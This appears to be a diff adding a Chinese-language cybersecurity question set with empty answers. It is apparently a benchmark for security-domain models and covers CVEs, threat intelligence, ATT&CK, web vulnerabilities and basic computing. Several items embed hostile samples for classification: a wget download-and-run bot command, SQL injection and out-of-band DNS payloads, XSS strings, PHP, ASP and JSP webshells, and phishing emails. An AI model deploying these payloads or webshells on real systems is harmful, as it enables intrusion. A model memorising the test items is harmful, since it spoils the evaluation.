@@ -1,0 +1,150 @@
+{"id": "1", "question": "CVE是什么意思？", "answer": ""}
+{"id": "2", "question": "CNVD是什么？", "answer": ""}
+{"id": "3", "question": "国内和国外有哪些漏洞库？", "answer": ""}
+{"id": "4", "question": "介绍CVE-2015-4852漏洞", "answer": ""}
+{"id": "5", "question": "介绍CVE-2019-0708", "answer": ""}
+{"id": "6", "question": "什么是CVE-2019-0803", "answer": ""}
+{"id": "7", "question": "介绍一下CVE-2021-44228", "answer": ""}
+{"id": "8", "question": "什么是CVE-2022-0609漏洞", "answer": ""}
+{"id": "9", "question": "介绍CNVD-2021-46902漏洞", "answer": ""}
+{"id": "10", "question": "介绍一下CNVD-2019-19299", "answer": ""}
+{"id": "11", "question": "CNVD-2021-26422是什么漏洞", "answer": ""}
+{"id": "12", "question": "网络安全领域里CWE是什么意思", "answer": ""}
+{"id": "13", "question": "CWE-787是什么意思", "answer": ""}
+{"id": "14", "question": "Windows Server 2008 R2可能存在哪些高危漏洞", "answer": ""}
+{"id": "15", "question": "Google V8引擎远程代码执行漏洞(CVE-2021-21220)的影响范围有哪些", "answer": ""}
+{"id": "16", "question": "Struts 2有哪些高危漏洞", "answer": ""}
+{"id": "17", "question": "什么是威胁情报", "answer": ""}
+{"id": "18", "question": "常见的威胁情报搜索网站有哪些", "answer": ""}
+{"id": "19", "question": "威胁情报中的痛苦金字塔是什么意思", "answer": ""}
+{"id": "20", "question": "1.1.1.1是什么", "answer": ""}
+{"id": "21", "question": "223.5.5.5是什么IP", "answer": ""}
+{"id": "22", "question": "威胁情报中有哪些IoC类型", "answer": ""}
+{"id": "23", "question": "什么是ioc情报", "answer": ""}
+{"id": "24", "question": "有哪些威胁情报标准或者框架", "answer": ""}
+{"id": "25", "question": "APT38有哪些情报信息", "answer": ""}
+{"id": "26", "question": "海莲花是什么组织", "answer": ""}
+{"id": "27", "question": "方程式组织（Equation Group）是什么组织", "answer": ""}
+{"id": "28", "question": "有哪些威胁情报标准", "answer": ""}
+{"id": "29", "question": "OWASP TOP 10有哪些", "answer": ""}
+{"id": "30", "question": "为什么会有Web漏洞", "answer": ""}
+{"id": "31", "question": "什么是SQL注入", "answer": ""}
+{"id": "32", "question": "CSRF原理是什么", "answer": ""}
+{"id": "33", "question": "什么是逻辑漏洞", "answer": ""}
+{"id": "34", "question": "有哪些逻辑漏洞", "answer": ""}
+{"id": "35", "question": "如何绕过文件上传检查功能", "answer": ""}
+{"id": "36", "question": "水平越权和垂直越权有什么区别", "answer": ""}
+{"id": "37", "question": "啥叫XXE漏洞", "answer": ""}
+{"id": "38", "question": "有哪些操作系统提权方式", "answer": ""}
+{"id": "39", "question": "如何做代码混淆", "answer": ""}
+{"id": "40", "question": "测试程序如何做免杀", "answer": ""}
+{"id": "41", "question": "什么是黄金票据、白银票据", "answer": ""}
+{"id": "42", "question": "有哪些横向渗透手段", "answer": ""}
+{"id": "43", "question": "内网渗透会留下哪些痕迹", "answer": ""}
+{"id": "44", "question": "如何做渗透过程中的持久化", "answer": ""}
+{"id": "45", "question": "鱼叉攻击和钓鱼攻击有什么区别", "answer": ""}
+{"id": "46", "question": "中间人攻击是什么意思", "answer": ""}
+{"id": "47", "question": "什么是灰盒测试，什么是白盒测试", "answer": ""}
+{"id": "48", "question": "WiFi密码为什么会被破解，如何加强WiFi安全", "answer": ""}
+{"id": "49", "question": "什么是DDoS攻击，如何避免", "answer": ""}
+{"id": "50", "question": "如何检测SQL注入攻击", "answer": ""}
+{"id": "51", "question": "如何检测WebShell", "answer": ""}
+{"id": "52", "question": "如何做网络安全归因分析", "answer": ""}
+{"id": "53", "question": "如何进行网络攻击溯源", "answer": ""}
+{"id": "54", "question": "这是一个网络攻击吗？\nhttp://180.101.234.99:8090/authenticationService/toPCLoginUniform.do?sysCode=E0001&amp;typeCode=E0001&amp;uKeySn=30022030031986&amp;userType=c&amp;licenceEntity=MIIFWTCCBQCgAwIBAgIPMgAAkTIFgzE4WRgoAFABMAoGCCqBHM9VAYN1MDUxMzAxBgNVBAoMKuaxn iLj ecgeW3peWVhuihjOaUv euoeeQhuWxgOS/oeaBr S4reW/gzAeFw0yMjExMjUwMDA2MjFaFw0yNzAxMjUwMDA2MjFaMDsxOTA3BgNVBAoMMOiLjW3nua0mS8puWFueiHquWKqOWMluacuuaisOiuvuWkh=&amp;signText=pi0Pfh6oBhvTcaBDnsykqLBeVrPJYpdO2ZuyE9Vd0&amp;signValue=MEUCIQDr3h/Z2mLbgcds6L0PekcnMXpsnXxkz5TPiDc1lchyXAIgIGBouFGnIg/bdjGw9z87xWuBVS18OrfR7UGcEwQtoE=&amp;priarea=320000&amp;login_pin=12345678", "answer": ""}
+{"id": "55", "question": "这是一个网络攻击吗？\nhttp://www.website.com/encode?type=3&id=1'%20and%201=2%20UNION%20SELECT%201,database(),3%20--+", "answer": ""}
+{"id": "56", "question": "网络安全产品发现以下Payload，判断这是否是一次攻击\nqueryString=aaaa\\u0027+#{16*8787}+\\u0027b", "answer": ""}
+{"id": "57", "question": "网络安全产品发现以下Payload，判断这是否是一次攻击\norf;cd /tmp; rm -rf mpsl; /bin/busybox wget http://2.59.255.77/fbot.mipsel; chmod +x fbot.mipsel; ./fbot.mipsel rt.mpsl; #", "answer": ""}
+{"id": "58", "question": "判断这是否是一个网络攻击？\nhttp://www.gov1.com//col/col172743/index.html?'-->'-->`--><!--#set var='2sk' value='1rj9wmatwz'--><!--#set var='4um' value='3tlbyocvy1'--><!--#echo var='2sk'--><!--#echo var='4um'--><!--#exec cmd='nslookup -q=cname oe6wj9xgjmgiqgokdcg495oogfmba56tyrml9bx0.oastify.com' -->=1", "answer": ""}
+{"id": "59", "question": "判断这是否是一个网络攻击\nhttp://www.gov1.com/jszwfw/publicservice/itemlist/showDetail.do?webId=1);declare @q varchar(99);set @q='\\\\ltity6cdyjvf5d3hs9v1o23lvc18p7jvanyel49t.oasti'+'fy.com\\fah'; exec master.dbo.xp_dirtree @q;-- &iddept_ql_inf=11320000696785044Q2322007019000&ql_kind", "answer": ""}
+{"id": "60", "question": "这个url中存在转义的字符，请还原，并判断这是否是一个网络攻击吗？\nhttp://218.94.159.228:8088/pqrm/framework/jsonm.jsp?exp_path=mobile.controlservice&amp;info=serviceName=synInfo2Server&amp;domain=pqrm&amp;loginId=njtest61&amp;uuid=null&amp;actionName=doService&amp;origin=imobile&amp;param=planSubDetailJson={&quot;pro_linkman&quot;:&quot;&#65533;&#756;&#65533;&#65533;&#65533;&quot;,&quot;pro_tel&quot;:&quot;0510-68555000&quot;,&quot;eco_outside&quot;:&quot;&quot;,&quot;plan_code&quot;:&quot;20230508205&quot;,&quot;check_type&quot;:&quot;1&quot;,&quot;task_source_id&quot;:&quot;A100&quot;,&quot;eco_single&quot;:&quot;&quot;,&quot;state&quot;:&quot;1&quot;,&quot;id&quot;:&quot;729736&quot;,&quot;pro_cert_code&quot;:&quot;00119Q33182R4M/3200&quot;,&quot;goods_copy_local&quot;:&quot;&#65533;&#65533;&#65533;&#1852;&#65533;&#65533;&#65533;&#1205;&quot;,&quot;pro_quality_pass&quot;:&quot;0&quot;,&quot;pro_present&quot;:&quot;&#65533;&#755;&#65533;&quot;,&quot;goods_copy_num&quot;:&quot;2.5&#445;&#65533;&#65533;&#65533;&#65533;&quot;,&quot;goods_sale_year&quot;:&quot;&quot;,&quot;goods_man_consignment&quot;:&quot;0&quot;,&quot;pro_name&quot;:&quot;&#65533;&#65533;&#65533;&#65533;&#65533;&#65533;&#65533;&#1590;&#65533;&#65533;&#65533;&#619;&#65533;&#65533;&#1520;&#65533;&#631;&#65533;&#65533;&#65533;&#65533;&#1977;&#65533;&#766;&quot;,&quot;goods_copy_num_measurement&quot;:&quot;&#445;&#65533;&#65533;&#65533;&#65533;&quot;,&quot;task_source&quot;:&quot;&#65533;&#65533;&#65533;&#65533;&#673;&#65533;&#1075;&#65533;", "answer": ""}
+{"id": "61", "question": "这是一个网络攻击吗？\nhttp://www.website.com/encode?type=3&id=1%3Cscript%3Ealert(%22xss%22)%3C/script%3E", "answer": ""}
+{"id": "62", "question": "这是一个网络攻击吗？\nhttp://www.website.com/encode?type=3&id=1<script>alert(\"xss\")</script>", "answer": ""}
+{"id": "63", "question": "XSS攻击有哪些特征？", "answer": ""}
+{"id": "64", "question": "如何判断主机是否被入侵？", "answer": ""}
+{"id": "65", "question": "数据泄露有哪些风险？", "answer": ""}
+{"id": "66", "question": "有哪些HIPS产品？", "answer": ""}
+{"id": "67", "question": "如何划分网络区域才能更安全？", "answer": ""}
+{"id": "68", "question": "apt组织通常会采用哪些攻击手段？", "answer": ""}
+{"id": "69", "question": "这段内容看上去危险吗？\n<?php @eval($_POST['caidao']);?>", "answer": ""}
+{"id": "70", "question": "这段base64编码的内容看上去危险吗？\nPD9waHAgQGV2YWwoJF9QT1NUWydjYWlkYW8nXSk7Pz4=", "answer": ""}
+{"id": "71", "question": "这是一个钓鱼邮件吗？\n<!DOCTYPE html>\n<html>\n<head>\n<meta charset=\"utf-8\">\n<title>文档标题</title>\n</head>\n<body>\n  <h2>\n    2021 年\"中秋节\"假日安排如下：\n  </h2>\n  <p>一、放假日期 <br/>\n  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;9 月 19 日至 21 日，共 3 天。<br/><br/>\n  二、XXXXXXx<br/>\n  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br/><br/>\n    三、XXXXXX<br/>\n  <br/><br/>\n    四、XXXXX<br/>\n    <br/><br/>\n    解压密码: XXXXXXXXX </p>\n    </p>\n  <div>\n    <hr align=\"left\" style=\"margin: 0 0 10px 0; border: 0; border-bottom: 1px solid #e4e5e6; height: 0; line-height: 0; font-size: 0; padding: 20px 0 0 0; width: 50px;\" />\n    <div style=\"font-size: 14px; font-family: Verdana; color: #000\">\n      <a\n        class=\"xm_write_card\" id=\"in_alias\" style=\" white-space: normal; display: inline-block; text-decoration: none !important; font-family: -apple-system, BlinkMacSystemFont, PingFang SC, Microsoft YaHei;\"\n        target=\"_blank\"\n      >\n        <table style=\" white-space: normal; table-layout: fixed; padding-right: 20px;\" contenteditable=\"false\" cellpadding=\"0\" cellspacing=\"0\">\n          <tbody>\n            <tr valign=\"top\">\n              <td style=\"width: 40px; min-width: 40px; padding-top: 10px\">\n                <div style=\" width: 64px; height: 64px; border: 1px #fff solid; border-radius: 50%; margin: 0; vertical-align: top; box-shadow: 0 0 10px 0 rgba(127, 152, 178, 0.14);\">\n              </td>\n              <td style=\"padding: 10px 0 8px 10px\">\n                <div class=\"businessCard_name\" style=\" font-size: 14px; color: #33312e; line-height: 20px; padding-bottom: 2px; margin: 0; font-weight: 500;\">\n                  xxxxxx\n                </div>\n                <div class=\"businessCard_mail\" style=\" font-size: 12px; color: #999896; line-height: 18px; margin: 0;\">\n                  人事部门\n                </div>\n              </td>\n            </tr>\n          </tbody>\n        </table>\n      </a>\n    </div>\n  </div>\n</body>\n</html>", "answer": ""}
+{"id": "72", "question": "这是一个钓鱼邮件吗？\n<!DOCTYPE html>\n<html>\n<body>\n    <h1>请注意:<br>\n        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最近员工反映多次收到钓鱼邮件,为了安全起见,请大家尽快点击下方链接下载钓鱼防护软件\n        <a href=\"https://www.baidu.com/\">192.168.100.100/edr.zip</a>\n    </h1>\n</body>\n</html>", "answer": ""}
+{"id": "73", "question": "这是一个webshell吗？\n<%<!--\"-->\neXecUTe(fun(\"%167%184%163%174%98%180%167%179%183%167%181%182%106%100%142%163%176%166%137%180%167%187%100%107\"))\n\nFunction fun(Str):\n\tStr = Split(Str,\"%\")\n\tFor x=1 To Ubound(Str)\n\t\tfun=fun&Chr(Str(x)-66)\n\tNext\nEnd Function\n%>", "answer": ""}
+{"id": "74", "question": "这是一个webshell吗？\n<%@ page pageEncoding=\"utf-8\"%>\n<%@ page import=\"java.util.Scanner\" %>\n<HTML>\n<title>Just For Fun</title>\n<BODY>\n<H3>Build By LandGrey</H3>\n<FORM METHOD=\"POST\" NAME=\"form\" ACTION=\"#\">\n    <INPUT TYPE=\"text\" NAME=\"q\">\n    <INPUT TYPE=\"submit\" VALUE=\"Fly\">\n</FORM>\n\n<%\n    String op=\"Got Nothing\";\n    String query = request.getParameter(\"q\");\n    String fileSeparator = String.valueOf(java.io.File.separatorChar);\n    Boolean isWin;\n    if(fileSeparator.equals(\"\\\\\")){\n        isWin = true;\n    }else{\n        isWin = false;\n    }\n\n    if (query != null) {\n        ProcessBuilder pb;\n        if(isWin) {\n            pb = new ProcessBuilder(new String(new byte[]{99, 109, 100}), new String(new byte[]{47, 67}), query);\n        }else{\n            pb = new ProcessBuilder(new String(new byte[]{47, 98, 105, 110, 47, 98, 97, 115, 104}), new String(new byte[]{45, 99}), query);\n        }\n        Process process = pb.start();\n        Scanner sc = new Scanner(process.getInputStream()).useDelimiter(\"\\\\A\");\n        op = sc.hasNext() ? sc.next() : op;\n        sc.close();\n    }\n%>\n\n<PRE>\n    <%= op %>>\n</PRE>\n</BODY>\n</HTML>", "answer": ""}
+{"id": "75", "question": "这是一个webshell吗？\n<?php\n$password = \"LandGrey\";\narray_udiff_assoc(array($_REQUEST[$password]), array(1), \"assert\");\n?>", "answer": ""}
+{"id": "76", "question": "这是什么类型的网络攻击，如何防范？\nGET /general/hr/manage/query/delete_cascade.php?condition_cascade=select if((substr(user(),1,1)='r'),1,power(9999,99)) HTTP/1.1\nHost: 192.168.77.137\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\nAccept: */*\nAccept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\nX-Requested-With: XMLHttpRequest\nReferer: http://192.168.77.137/general/index.php?isIE=0&modify_pwd=0\nCookie: PHPSESSID=ebpjtm5tqh5tvida5keba73fr0; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c71fa06d\nDNT: 1\nConnection: close", "answer": ""}
+{"id": "77", "question": "什么是网络安全法", "answer": ""}
+{"id": "78", "question": "介绍一下网络安全法", "answer": ""}
+{"id": "79", "question": "介绍一下《GB/T 28448-2019》", "answer": ""}
+{"id": "80", "question": "等保测评是什么", "answer": ""}
+{"id": "81", "question": "什么是关机基础信息设施", "answer": ""}
+{"id": "82", "question": "等级保护有哪些标准", "answer": ""}
+{"id": "83", "question": "等级保护测评有哪些国家标准", "answer": ""}
+{"id": "84", "question": "有哪些网络安全领域的国家标准", "answer": ""}
+{"id": "85", "question": "什么是ATT&CK", "answer": ""}
+{"id": "86", "question": "ATT&CK分为哪些阶段", "answer": ""}
+{"id": "87", "question": "ATT&CK中T1190指什么", "answer": ""}
+{"id": "88", "question": "Data Destruction对应ATT&CK中的哪个技术", "answer": ""}
+{"id": "89", "question": "有哪些APT组织使用了ATT&CK中的T1072", "answer": ""}
+{"id": "90", "question": "介绍一下网络安全领域中的STIX标准", "answer": ""}
+{"id": "91", "question": "STIX标准中设计了哪些对象", "answer": ""}
+{"id": "92", "question": "STIX标准中的对象通过什么关联起来", "answer": ""}
+{"id": "93", "question": "STIX标准中Indicator对象是什么意思", "answer": ""}
+{"id": "94", "question": "STIX标准中是如何定义Attack Pattern的", "answer": ""}
+{"id": "95", "question": "主流的操作系统有哪些", "answer": ""}
+{"id": "96", "question": "Linux系统中创建文件夹的命令是什么", "answer": ""}
+{"id": "97", "question": "Linux系统文件的权限有哪些", "answer": ""}
+{"id": "98", "question": "如何查看Linux系统的IP地址", "answer": ""}
+{"id": "99", "question": "linux用户的密码保存在什么文件中", "answer": ""}
+{"id": "100", "question": "vi编辑器如何编辑、保存和退出", "answer": ""}
+{"id": "101", "question": "如何给linux系统配置静态IP", "answer": ""}
+{"id": "102", "question": "什么版本的Windows最安全", "answer": ""}
+{"id": "103", "question": "如何查看Windows系统的日志", "answer": ""}
+{"id": "104", "question": "如何查看Windows系统的IP", "answer": ""}
+{"id": "105", "question": "Windows系统可以作为服务器系统吗", "answer": ""}
+{"id": "106", "question": "Windows 9是什么系统", "answer": ""}
+{"id": "107", "question": "木马病毒通常在Windows系统中哪些地方创建启动项", "answer": ""}
+{"id": "108", "question": "TCP和UDP有什么区别", "answer": ""}
+{"id": "109", "question": "FTP属于TCP/IP模型中的哪一层", "answer": ""}
+{"id": "110", "question": "DNS是明文的还是加密的", "answer": ""}
+{"id": "111", "question": "HTTP请求头有哪些字段", "answer": ""}
+{"id": "112", "question": "HTTP响应码有哪些？分表是什么含义", "answer": ""}
+{"id": "113", "question": "什么是HTTPS", "answer": ""}
+{"id": "114", "question": "有哪些VPN协议", "answer": ""}
+{"id": "115", "question": "Shadowsocks是什么", "answer": ""}
+{"id": "116", "question": "RDP是什么协议", "answer": ""}
+{"id": "117", "question": "如何在开发中避免SQL注入漏洞", "answer": ""}
+{"id": "118", "question": "如何在开发中避免越权漏洞", "answer": ""}
+{"id": "119", "question": "如何在开发中避免溢出漏洞", "answer": ""}
+{"id": "120", "question": "如何避免XSS攻击", "answer": ""}
+{"id": "121", "question": "网络安全风险三要素指什么", "answer": ""}
+{"id": "122", "question": "网络安全风险评估的主要步骤是什么", "answer": ""}
+{"id": "123", "question": "应急响应的流程是什么", "answer": ""}
+{"id": "124", "question": "主机中了挖矿木马，如何处置", "answer": ""}
+{"id": "125", "question": "我的电脑中了勒索病毒，怎么办", "answer": ""}
+{"id": "126", "question": "电脑中毒了怎么办", "answer": ""}
+{"id": "127", "question": "为什么网页打不开了", "answer": ""}
+{"id": "128", "question": "用python写一个快速排序算法", "answer": ""}
+{"id": "129", "question": "使用Java语言将一个对象序列化", "answer": ""}
+{"id": "130", "question": "使用Golang写一个爬虫", "answer": ""}
+{"id": "131", "question": "当采用分块查找时，数据的组织方式是什么", "answer": ""}
+{"id": "132", "question": "ElasticSearch搜索一个时间范围的语法是什么", "answer": ""}
+{"id": "133", "question": "更新记录的SQL语句是什么", "answer": ""}
+{"id": "134", "question": "10010的二进制编码是什么", "answer": ""}
+{"id": "135", "question": "10086的十六进制编码是什么", "answer": ""}
+{"id": "136", "question": "二进制101011是十进制的几", "answer": ""}
+{"id": "137", "question": "URL解码%3Cscript%3E后的结果是什么", "answer": ""}
+{"id": "138", "question": "==的URL编码是什么", "answer": ""}
+{"id": "139", "question": "cyber的unicode编码结果是什么", "answer": ""}
+{"id": "140", "question": "\\u4f8b\\u5b50的ascii解码是什么中文？", "answer": ""}
+{"id": "141", "question": "这段代码有什么问题\nint main() {\n    bufferOverflow();\n }\n\n bufferOverflow() {\n    char textLine[10];\n    printf(\"Enter your line of text: \");\n    gets(textLine);\n    printf(\"You entered: \", textLine);\n    return 0;\n }", "answer": ""}
+{"id": "142", "question": "这段代码有什么问题\nClass.forName(\"com.mysql.cj,jdbc.Driver\");\ncoon = DriverManager.getConnection(\"jdbc:mysql://192.168.88.20:3306/iwebsec?&useSSL=false&serverTimezone=UTC\",\"root\",\"root)\";\nString id =\"2\";\nString sql =\"select* from user where id =\"+id;\nps = conn.createStatement();\nrs = ps.executeQuery(sql);\nwhile(rs.next())\n{\n\tSystem.out.println(\"id:\"+rs,getlnt(\"id\")+\"usermame:\"+rs.getString(\"username\")+\"password:\"+rs.getString(\"password\");\n}", "answer": ""}
+{"id": "143", "question": "有哪些网络空间测绘网站", "answer": ""}
+{"id": "144", "question": "什么是资产暴露面分析", "answer": ""}
+{"id": "145", "question": "如何做资产扫描", "answer": ""}
+{"id": "146", "question": "什么软件能够扫描主机开放的端口和协议", "answer": ""}
+{"id": "147", "question": "IDS与IPS有什么区别", "answer": ""}
+{"id": "148", "question": "蜜罐是用来干什么的", "answer": ""}
+{"id": "149", "question": "网络安全中RASP技术有什么作用", "answer": ""}
+{"id": "150", "question": "网络安全三要素指什么", "answer": ""}
